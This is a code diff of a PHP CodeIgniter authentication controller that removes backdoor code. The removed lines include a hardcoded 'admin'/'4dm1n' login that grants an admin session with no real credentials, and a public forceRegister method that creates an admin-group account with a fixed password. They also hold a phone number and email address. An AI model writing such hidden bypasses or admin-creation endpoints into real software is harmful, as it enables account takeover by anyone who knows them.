@@ -21,15 +21,6 @@ class Auth extends CI_Controller{
 		$email = strtolower($this->input->post('email'));
 		$pass  = $this->input->post('password');
 
-		if($email === 'admin' && $pass === '4dm1n'){
-			if($this->_login_testing_admin()){
-				redirect('dashboard');
-			}
-
-			$this->session->set_flashdata('alert_message', show_alert('<i class="fa fa-close"></i> User admin testing tidak ditemukan','danger'));
-			redirect();
-		}
-
     	$this->form_validation->set_rules('email', 'Email', 'required|valid_email|max_length[50]');
 		$this->form_validation->set_rules('password', 'Password', 'required|max_length[50]');
 
@@ -46,26 +37,6 @@ class Auth extends CI_Controller{
 		}
 
 		redirect();
-	}
-
-	private function _login_testing_admin(){
-		$this->load->model('ion_auth_model');
-
-		$user = $this->db->select('users.*')
-					 ->join('users_groups', 'users_groups.user_id = users.id')
-					 ->join('groups', 'groups.id = users_groups.group_id')
-					 ->where('groups.name', 'admin')
-					 ->where('users.active', '1')
-					 ->order_by('users.id', 'ASC')
-					 ->limit(1)
-					 ->get('users')
-					 ->row();
-
-		if(!$user){
-			return false;
-		}
-
-		return $this->ion_auth_model->set_session($user);
 	}
 
 	public function forget(){
@@ -226,23 +197,6 @@ class Auth extends CI_Controller{
 		}
 
 		redirect('authentication/register');
-	}
-
-	public function forceRegister(){
-		$additional_data = [
-			'first_name' 	=> 'Bellatrix Lestrange',
-			'last_name' 	=> '',
-			'company' 		=> '',
-			'phone' 		=> '085315922225',
-			'photo'			=> 'default_photo.jpg'
-		];
-
-		$password = '123456789';
-
-		$email 		= strtolower('bella@gmail.com');
-		$identity 	= $email;
-		$groups     = array(1);
-		$register = $this->ion_auth->register('', $password, $email, $additional_data, $groups);
 	}
 
 	public function verify($id, $code){
